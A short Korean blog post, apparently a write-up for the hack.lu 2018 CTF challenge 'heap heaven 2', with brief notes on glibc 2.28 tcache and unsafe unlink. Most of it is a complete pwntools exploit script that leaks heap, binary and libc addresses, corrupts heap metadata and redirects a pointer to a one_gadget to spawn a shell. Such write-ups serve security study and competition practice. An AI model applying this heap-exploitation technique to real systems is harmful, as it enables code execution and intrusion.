---
title: hack.lu 2018 - heap heaven 2
date: 2018-10-19 - 01:19:53
categories:
- Heap Exploit
- CTF write up
tags:
- How2heap tcache
- Unsafe Unlink
---

```c
Please select your action:
[1] : write to heap
[2] : alloc on heap
[3] : free from heap
[4] : leak
[5] : exit
```

시험공부하다가 하기 싫어서 쓰는글..ㅠㅠ pox 이후로 다시 만난 tcache..



별거 없고 glibc 2.28 tcache + unsafe unlink 이다.

릭할때 로컬에선 됐는데 리모트는 안되고 리모트는 되는데 로컬이 안될때가 있었다.. 뭐지..ㅋㅋㅋ

다른 라이트업 보니까 state fd 영역 쓰는 걸 이용해서 함수 포인터를 바꿔주더라..



```python
from pwn import *

w = remote("arcade.fluxfingers.net",1809)
#w = process("./heap_heaven_2")
libso = ELF("./heaven_libc.so.6")

def write(off, cont):
	w.sendline("1")
	w.sendlineafter("?",str(len(cont)))
	w.sendlineafter("?",str(off))
	w.send(cont)

def free(off):
	w.sendline("3")
	w.sendlineafter("?",str(off))

def leak(off):
	w.sendline("4")
	w.sendlineafter("?",str(off))
	w.recvline()
	return w.recvline()

for i in range(0,15):
    write(0x200*i,p64(0)+p64(0x201))

for i in range(4,13):
    free(0x10+0x200*i)

my = 0x610
free(my)

heap = u64(leak(my+0x8)[:-1].ljust(8,"\x00"))
log.info("heap:: "+hex(heap))

write(my,p64(heap-0x10))
code = u64(leak(my)[:-1].ljust(8,"\x00"))
log.info("code:: "+hex(code))
code_base = code-0x1670

offset = libso.symbols['__strtoul']
write(my,p64(code_base+0x3fc8))
libc = u64(leak(my)[:-1].ljust(8,"\x00")) -offset
log.info("libc:: "+hex(libc))

target = code_base+0x4048-0x10

write(0x10,p64(target-0x8)+p64(target))
write(0x200,p64(0x200)+p64(0x200))

free(0x210)

one=[0x45200 ,0x45254, 0xe75f0]

write(0x30,p64(target+0x38))
write(0x40,p64(libc+one[2])+p64(libc+one[2]))
write(0x10,p64(target+0x28))

w.interactive()

```



못 풀엇던거..

heap_hell은 로직버그엿고 slot_machine 은 tcache 트릭..
